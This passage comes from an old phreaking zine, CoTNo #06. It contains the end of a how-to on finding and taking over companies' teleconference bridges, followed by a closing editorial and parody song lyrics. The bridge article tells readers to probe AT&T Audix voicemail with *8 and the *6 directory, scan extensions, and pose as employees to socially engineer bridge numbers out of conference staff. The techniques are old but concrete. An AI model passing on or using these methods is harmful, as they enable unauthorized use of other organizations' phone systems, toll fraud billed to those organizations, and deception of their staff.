equipment is usually integrated into their voice mail and/or PBX computers
and allows the company or school to hold teleconferences without relying on
the national teleconference providers.

For those out there (if any?) that remember the 904-348 bridge,  it was a
System 75 PBX bridge used by a home school, where the students would call in
in the daytime and take tests and attend classes.  The way it was used was as
follows:

        You would dial 348-XX00 to 348-XX19.  That was ONE of the bridges.
        Anybody that connected to any number from 00 to 19 would be connected
        to the bridge.  If two people tried to connect to the same number, it
        would be busy. Thus, it had 20 lines.  A second bridge was reached at
        348-XX20 to 348-XX29. This was off the same system, but gave you a
        different bridge with 10 lines.  Yet another bridge could be found at
        348-XX30 to 348-XX69 off the same system.

You could call in during the daytime and mess with the teachers and kids or
whatever, but occasionally they would hang you up, or call you back or
something.  This one went down because it wasn't blocked from collect calls,
and the number got very widespread throughout the k0d3lyN3 and BBS world and
was constantly collect-called by lamers who didn't know how to phreak.  It is,
however, occasionally up for the students to use, but goes down as soon class
is over.

FINDING A BRIDGE.
-----------------
Finding a bridge use to be the easiest thing for me.  It used to be, like,
WHAT I DID.  I would put one up on my codeline, and spread it to the others,
and would call into QSD or Lutz or something about 30 minutes afterward
and get messages from people who I didn't even know saying "Hey,man,thanx
for puttin up that bridge!".  These days I don't even bother.  I don't WANT
to talk to half these idiots that are around today.

Anyway, lets say you want to find a bridge.  Go through the phonebook and look
up the all the big businesses.  Call the main numbers that you find after
hours and find out which ones have voice mail systems.  In this article, I
will focus on the Audix voicemail system made by AT&T so look for those.  To
tell if your target is using Audix, press *8 during the greet, and if it says
"Enter the four digit extension and pound sign." you have found one.  A
complete guide to hacking Audix voice mail can be found in CoTNo #1,
article #1.  Railroad companies like CSX and AT&T owned companies like
Transtech, or Card Services often have Audix systems with bridges.

Once you have the targeted Audix system,you need to start scanning for the
system extensions.  Hit *6 for the names directory and try entering
CONFERENCE, BRIDGE, or TELE.  You COULD possibly get the actual extension to
the bridge spit out right at you (as with CSX's system),or at least most
systems have that extension where you hear the person state their name
"Conference Planning".  If this is the case,you need to get a voice mail
box off the system and send a message to whatever extension Conference
Planning is saying something like "Yes, I need a conference set up for
such and such a date & such and such a time".  This will more than likely
work and Conference Planning will respond usually with either "No problem,
the teleconference bridge is at XXXX" or "All we need is the PIN
number you want."

However, a lot of systems do not have their *6 directory system configured
very good at all, so you might want to try scanning all the XX00 and XX99
and find out where all the computer-related extensions are located at.
Or you might want to social engineer it out of one of the people located
at an extension.  Try calling from within your box and acting like you work
there.

Once you have found what you think is the bridge,you need to test it out
with a friend.  If he calls into the same extension and gets a busy signal,
you may want tell him to try the next extension up.  If the bridge is
multi-lined, have him figure out how many lines the bridge has and make
sure the lines are all going to the same bridge and not 3 different
bridges or something.  Note that if you are scanning on a Railroad
companies system, you will sometimes come to an extension you might think
is a bridge and end up to be dispatchers.  So once you sign on to what you
believe is the bridge,hit a few dtmf tones and make sure you don't hear
someone say "You done hittin funny buttons!!!" or "dispatcher,mike."

SECURITY ON A BRIDGE.
---------------------
Security on a bridge is a lot different than on an alliance or on a k0nPh.
You usually don't have to worry about it getting cancelled and the bridge
usually will not ever go down if you don't third-party or collect call to
it.  You are not dealing with the phone company here, you are dealing
with whatever business owns it, and if they detect a lot of activity on
the extension, they will usually either warn you to leave by recording the
conversations and playing them back to you, or just change the extension.
DO expect to be dealing with the business communication security person,
though, at one time or another.  They will usually talk to you and explain to
you why they need you to leave, and most of the time I found out, it wasn't
because of the people using their bridge, it was because of the collect-
calling, third party billing or the fact that people were using it via the
800 number and the company was having to pick up the tab.  I don't recommend
finding a bridge and giving it to the entire world because when you are
not on, you don't know what goes on in the conversation, and if the company
does finally decide to get it investigated, the investigators seem to go
after the same thing every time: the source that gave out the bridge in
the first place.

CONCLUSION
----------
Hopefully you have learned something from all this.  With a little time and
patience, you can set up a bridge that will last for weeks, maybe months.
And besides, hacking out a phone system will teach you a lot more than
than setting up a k0nPh off your neighbor's phone terminal.  So next time
you see someone flash "k0nPhiNf0!?", tell them to get off there ass and
try hacking one out for a change.

Please note the /WR. Until now I have not been in textfiles at large, only
a few given to good friends. There have been other `DJ's out there; as many
as six by my count, so far. So even that my group has had but one member
for over four years, I keep the tag to distinguish myself.

Well, while on a (pretty lame, I must admit) conference with a barrage of
lame people, sending streams of DTMF tones, long belches, humming, and
music down the line, I got an idea. At one point the B-52's `Roam' was
played in the background during a half-intelligent discussion of cellular
telecommunications. These lyrics almost came to me almost immediately, and
these are the results. I intend to record this song for real in a few
months or so; I do have the instrumental of the real song and it would be
somewhat fun to do. Maybe a .AU will be out there on the Web, sometime...
and by that time these lame people might grow up. (But, I can't ask for
everything.)

End of CoTNo #06

I know you expect some snappy ending as usual to another successful issue
of Communications of The New Order, but considering the grimness of much
of this issue I don't think it would be appropriate.  Despite all of the
bad news that was presented in this issue, I hope that everyone will
"keep the faith", as it were.  Explore, learn, educate.  But don't do
anything stupid.  The powers that be are becoming increasingly intent
upon stopping those who are labeled as "hackers".  And everyday, there
are more of us for them to stop.  Everyday, we are being introduced to
new technologies that few people understand, and few people want to
understand.  Our desire to understand can be achieved, but we must be
careful.

Even though you just read this issue's Elite Music, I thought I would
finish off with another song that has special significance to me.  This
showed up in my e-mail the other day and it really made me think.  I
hope it is as meaningful to you as it was for me...


TNO MAN
-------
To the Tune of Desperado, by The Eagles


TNO man, why don't you come to your senses?
You been out jumping' fences into those Bell yards.
Oh you're a smart one, I know that you got your reasons,
these things that are pleasin' can hurt you somehow.

   Don't you hack on those old .mil sites,
   they'll catch you if you're lazy,
   you know diverting twice is always your best bet.
   Now it seems to me some eleet things
   have been shown upon your screen
   but you only want the ones that you can't hack.

TNO man, oh you ain't gettin' no younger,
your hunger for knowledge, it's drivin' you on.
And hacking, oh hacking, well that's just some people talkin',
your prison is waitin' at the end of the line.

   Don't your power get old on the Internet?
   The account won't die and the root won't mind,
   it's hard to tell the night time from the day.
   You're losin' all your highs and lows,
   ain't it funny how the feelin' goes away?

TNO man, why don't you come to your senses?
Come down from your firewalls, open the gateway.
It may be laming' but there's a job waiting for you.
You better let somebody hire you LET SOMEBODY HIRE YOU
you better let somebody hire you before it's too late.
